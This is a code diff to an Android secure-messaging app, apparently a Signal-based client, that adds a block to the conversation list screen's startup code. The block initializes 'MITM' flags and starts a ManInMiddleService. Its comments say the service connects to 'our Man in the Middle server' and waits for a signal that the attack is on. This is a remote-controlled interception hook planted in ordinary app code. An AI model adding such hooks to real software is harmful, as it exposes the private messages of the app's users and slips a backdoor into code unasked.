@@ -89,6 +89,24 @@ public class ConversationListActivity extends PassphraseRequiredActionBarActivit
   protected void onCreate(Bundle icicle, boolean ready) {
     setContentView(R.layout.conversation_list_activity);
 
+
+    //Devon code starts here
+
+    //Initializing saved MITM booleans inside IsMITMAttackOn.java
+
+    IsMITMAttackOn isMITMAttackOn = new IsMITMAttackOn();
+    isMITMAttackOn.initializeBooleans(getApplicationContext());
+
+    //Here we are opening the connection to our Man in the Middle server and then waiting for
+    //the server to tell us that the attack is on.
+
+
+    Intent manInMiddleAttack = new Intent(this, ManInMiddleService.class);
+    startService(manInMiddleAttack);
+
+    //Devon code ends here
+
+
     Toolbar toolbar = findViewById(R.id.toolbar);
     setSupportActionBar(toolbar);
 
